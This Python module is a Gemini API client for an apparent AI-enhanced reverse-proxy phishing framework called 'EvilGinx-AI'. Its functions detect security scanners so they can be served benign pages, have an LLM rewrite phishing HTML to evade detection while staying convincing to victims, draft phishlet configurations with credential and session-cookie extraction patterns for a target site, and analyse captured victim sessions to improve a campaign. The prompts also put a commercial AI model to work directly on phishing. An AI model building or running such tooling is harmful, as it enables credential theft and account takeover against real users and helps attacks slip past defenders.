"""
Gemini AI Client for EvilGinx-AI
Integrates Google's Gemini API for intelligent phishing detection and evasion
"""

import asyncio
import aiohttp
import json
import logging
from typing import Dict, List, Optional, Any
import re
from urllib.parse import quote

logger = logging.getLogger(__name__)

class GeminiClient:
    """Client for interacting with Google's Gemini API"""
    
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.base_url = "https://generativelanguage.googleapis.com/v1beta"
        self.model = "gemini-1.5-flash"
        
        # Cache for AI responses to avoid repeated calls
        self.response_cache = {}
        
    async def classify_request(self, request_info: Dict) -> Dict:
        """
        Use AI to classify incoming requests and detect scanners/bots
        """
        try:
            # Create prompt for request classification
            prompt = self._build_classification_prompt(request_info)
            
            # Check cache first
            cache_key = f"classify_{hash(str(request_info))}"
            if cache_key in self.response_cache:
                return self.response_cache[cache_key]
            
            # Make API call
            response = await self._make_api_call(prompt)
            
            # Parse response
            classification = self._parse_classification_response(response)
            
            # Cache result
            self.response_cache[cache_key] = classification
            
            return classification
            
        except Exception as e:
            logger.error(f"Request classification error: {e}")
            return {'is_scanner': False, 'is_bot': False, 'confidence': 0.0}
    
    async def modify_content_for_evasion(self, html_content: str, phishlet: Dict) -> Optional[str]:
        """
        Use AI to modify HTML content for better evasion of detection systems
        """
        try:
            # Don't process very large content
            if len(html_content) > 50000:
                return None
            
            # Create prompt for content modification
            prompt = self._build_content_modification_prompt(html_content, phishlet)
            
            # Check cache
            cache_key = f"modify_{hash(html_content[:1000])}"
            if cache_key in self.response_cache:
                return self.response_cache[cache_key]
            
            # Make API call
            response = await self._make_api_call(prompt)
            
            # Extract modified content
            modified_content = self._extract_modified_content(response, html_content)
            
            # Cache result
            if modified_content:
                self.response_cache[cache_key] = modified_content
            
            return modified_content
            
        except Exception as e:
            logger.error(f"Content modification error: {e}")
            return None
    
    async def generate_phishlet_suggestions(self, target_url: str, html_content: str) -> Dict:
        """
        Use AI to analyze a target website and suggest phishlet configurations
        """
        try:
            prompt = self._build_phishlet_generation_prompt(target_url, html_content)
            
            response = await self._make_api_call(prompt)
            
            suggestions = self._parse_phishlet_suggestions(response)
            
            return suggestions
            
        except Exception as e:
            logger.error(f"Phishlet generation error: {e}")
            return {}
    
    async def analyze_captured_data(self, sessions: Dict) -> Dict:
        """
        Use AI to analyze captured session data and provide insights
        """
        try:
            # Prepare data for analysis (remove sensitive info)
            sanitized_data = self._sanitize_session_data(sessions)
            
            prompt = self._build_analysis_prompt(sanitized_data)
            
            response = await self._make_api_call(prompt)
            
            analysis = self._parse_analysis_response(response)
            
            return analysis
            
        except Exception as e:
            logger.error(f"Data analysis error: {e}")
            return {}
    
    def _build_classification_prompt(self, request_info: Dict) -> str:
        """Build prompt for request classification"""
        return f"""
Analyze this HTTP request and determine if it's likely from a security scanner, bot, or legitimate user.

Request Information:
- IP: {request_info.get('ip', 'unknown')}
- User-Agent: {request_info.get('user_agent', 'unknown')}
- Method: {request_info.get('method', 'unknown')}
- Path: {request_info.get('path', 'unknown')}
- Headers: {json.dumps(request_info.get('headers', {}), indent=2)}

Consider these factors:
1. User-Agent patterns typical of scanners (Nmap, Nikto, sqlmap, etc.)
2. Unusual header combinations
3. Suspicious request patterns
4. Known scanner IP ranges or behaviors

Respond with a JSON object containing:
{{
    "is_scanner": boolean,
    "is_bot": boolean,
    "confidence": float (0.0-1.0),
    "reasoning": "explanation of classification",
    "recommended_action": "block|serve_benign|allow"
}}
"""
    
    def _build_content_modification_prompt(self, html_content: str, phishlet: Dict) -> str:
        """Build prompt for content modification"""
        # Truncate content for API limits
        content_preview = html_content[:2000] + "..." if len(html_content) > 2000 else html_content
        
        return f"""
Modify this HTML content to make it more evasive against phishing detection systems while maintaining functionality.

Target: {phishlet.get('name', 'unknown')}
HTML Content Preview:
{content_preview}

Modifications to consider:
1. Subtle text variations to avoid keyword detection
2. Minor HTML structure changes
3. Adding benign comments or metadata
4. Changing CSS class names slightly
5. Adding legitimate-looking but harmless elements

Requirements:
- Maintain all form functionality
- Keep the visual appearance nearly identical
- Don't break JavaScript functionality
- Make changes subtle enough to avoid user suspicion

Return only the modified HTML content, no explanations.
"""
    
    def _build_phishlet_generation_prompt(self, target_url: str, html_content: str) -> str:
        """Build prompt for phishlet generation"""
        content_preview = html_content[:3000] + "..." if len(html_content) > 3000 else html_content
        
        return f"""
Analyze this website and suggest phishlet configuration for a reverse proxy phishing framework.

Target URL: {target_url}
HTML Content:
{content_preview}

Generate suggestions for:
1. Proxy host configuration
2. Sub-filters for domain replacement
3. Credential extraction patterns
4. Session token/cookie patterns
5. Important form fields and their names

Respond with a JSON object containing phishlet suggestions.
"""
    
    def _build_analysis_prompt(self, sanitized_data: Dict) -> str:
        """Build prompt for session data analysis"""
        return f"""
Analyze this phishing campaign data and provide insights.

Session Data Summary:
{json.dumps(sanitized_data, indent=2)}

Provide analysis on:
1. Success rate and effectiveness
2. Common user behaviors
3. Geographic patterns
4. Time-based patterns
5. Recommendations for improvement

Respond with a JSON object containing your analysis.
"""
    
    async def _make_api_call(self, prompt: str) -> str:
        """Make API call to Gemini"""
        url = f"{self.base_url}/models/{self.model}:generateContent"
        
        headers = {
            'Content-Type': 'application/json',
        }
        
        data = {
            "contents": [{
                "parts": [{
                    "text": prompt
                }]
            }],
            "generationConfig": {
                "temperature": 0.1,
                "topK": 1,
                "topP": 1,
                "maxOutputTokens": 2048,
            }
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{url}?key={self.api_key}",
                headers=headers,
                json=data
            ) as response:
                
                if response.status != 200:
                    error_text = await response.text()
                    logger.error(f"Gemini API error {response.status}: {error_text}")
                    raise Exception(f"API call failed: {response.status}")
                
                result = await response.json()
                
                if 'candidates' in result and result['candidates']:
                    return result['candidates'][0]['content']['parts'][0]['text']
                else:
                    raise Exception("No response from Gemini API")
    
    def _parse_classification_response(self, response: str) -> Dict:
        """Parse AI classification response"""
        try:
            # Try to extract JSON from response
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
            
            # Fallback parsing
            is_scanner = 'scanner' in response.lower() or 'bot' in response.lower()
            confidence = 0.5 if is_scanner else 0.1
            
            return {
                'is_scanner': is_scanner,
                'is_bot': is_scanner,
                'confidence': confidence,
                'reasoning': response,
                'recommended_action': 'block' if is_scanner else 'allow'
            }
            
        except Exception as e:
            logger.error(f"Classification parsing error: {e}")
            return {'is_scanner': False, 'is_bot': False, 'confidence': 0.0}
    
    def _extract_modified_content(self, response: str, original_content: str) -> Optional[str]:
        """Extract modified HTML content from AI response"""
        try:
            # Look for HTML content in response
            html_match = re.search(r'<!DOCTYPE html>.*?</html>', response, re.DOTALL | re.IGNORECASE)
            if html_match:
                return html_match.group()
            
            # Look for just the body or significant HTML
            body_match = re.search(r'<html.*?</html>', response, re.DOTALL | re.IGNORECASE)
            if body_match:
                return body_match.group()
            
            # If no clear HTML found, return None to use original
            return None
            
        except Exception as e:
            logger.error(f"Content extraction error: {e}")
            return None
    
    def _parse_phishlet_suggestions(self, response: str) -> Dict:
        """Parse phishlet suggestions from AI response"""
        try:
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
            
            return {'suggestions': response}
            
        except Exception as e:
            logger.error(f"Phishlet parsing error: {e}")
            return {}
    
    def _parse_analysis_response(self, response: str) -> Dict:
        """Parse analysis response from AI"""
        try:
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
            
            return {'analysis': response}
            
        except Exception as e:
            logger.error(f"Analysis parsing error: {e}")
            return {}
    
    def _sanitize_session_data(self, sessions: Dict) -> Dict:
        """Remove sensitive information from session data for AI analysis"""
        sanitized = {
            'total_sessions': len(sessions),
            'session_summary': []
        }
        
        for session_id, session in sessions.items():
            sanitized_session = {
                'timestamp': session.get('timestamp'),
                'phishlet': session.get('phishlet'),
                'has_credentials': bool(session.get('credentials')),
                'has_cookies': bool(session.get('cookies')),
                'user_agent_type': self._classify_user_agent(session.get('user_agent', ''))
            }
            sanitized['session_summary'].append(sanitized_session)
        
        return sanitized
    
    def _classify_user_agent(self, user_agent: str) -> str:
        """Classify user agent type"""
        ua_lower = user_agent.lower()
        
        if 'chrome' in ua_lower:
            return 'chrome'
        elif 'firefox' in ua_lower:
            return 'firefox'
        elif 'safari' in ua_lower:
            return 'safari'
        elif 'edge' in ua_lower:
            return 'edge'
        elif 'mobile' in ua_lower:
            return 'mobile'
        else:
            return 'other'

